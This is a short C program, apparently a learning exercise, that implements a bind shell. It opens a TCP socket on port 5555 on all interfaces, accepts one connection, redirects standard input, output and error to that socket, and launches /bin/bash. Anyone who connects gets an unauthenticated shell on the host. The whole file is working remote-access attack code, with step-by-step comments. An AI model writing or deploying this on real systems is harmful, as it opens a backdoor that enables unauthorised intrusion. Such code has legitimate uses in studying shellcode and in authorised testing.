#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(void){

  // socket()
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  // will return -1 if error occurs 
  if (sockfd < 0){
    printf("Socket descriptor failed...\n");
  }
  else {
    printf("Socket descriptor created: %d\n", sockfd);
  }

  //bind()
  struct sockaddr_in server_addr; // create instance of sockaddr_in
  server_addr.sin_family = AF_INET; // IPV4
  server_addr.sin_addr.s_addr = INADDR_ANY; // listen in any local port
  server_addr.sin_port = htons(5555); // convert to network byte order

  // assigning a name to a socket
  int bindfd = bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

  //check bindfd
  if (bindfd < 0){
    printf("bind name assign failed...\n");
  }
  else {
    printf("bind name assign success: %d\n", bindfd);
  }

  // listen()
  int listenfd = listen(sockfd, 0);
  if (listenfd < 0){
    printf("listen failed...\n");
  } else {
    printf("listening...\n");
  }

  // accept()
  int acceptfd = accept(sockfd, NULL, NULL);
  // check accept
  if (acceptfd < 0){
    printf("accept() failed...\n");
  } else {
    printf("acceptfd = %d\n", acceptfd);
  }

  //Dup2  
  for (int i = 0; i < 3; i++){

    dup2(acceptfd, i);
  }
  
  // Execve
  char *filepath = "/bin/bash";
  char *argv[] = {filepath, NULL, NULL };
  execve(filepath, argv, NULL);


  return 0;
}
